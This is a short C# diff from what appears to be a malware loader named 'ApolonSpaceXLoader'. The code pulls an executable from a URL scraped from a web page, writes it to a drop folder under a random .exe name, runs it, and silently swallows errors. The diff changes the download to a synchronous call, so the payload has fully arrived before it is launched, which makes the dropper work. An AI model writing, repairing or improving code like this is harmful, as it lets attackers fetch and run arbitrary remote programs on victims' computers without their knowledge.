@@ -69,7 +69,7 @@ namespace ApolonSpaceXLoader
                             try
                             {
                                 ServicePointManager.SecurityProtocol = SecurityProtocolType.Ssl3 | SecurityProtocolType.Tls;
-                                wc.DownloadFileAsync(new Uri(urlOnPage), $"{dropPath}\\{rnd}.exe");
+                                wc.DownloadFile(new Uri(urlOnPage), $"{dropPath}\\{rnd}.exe");
                                 Process.Start($"{dropPath}\\{rnd}.exe");
                             }
                             catch { }
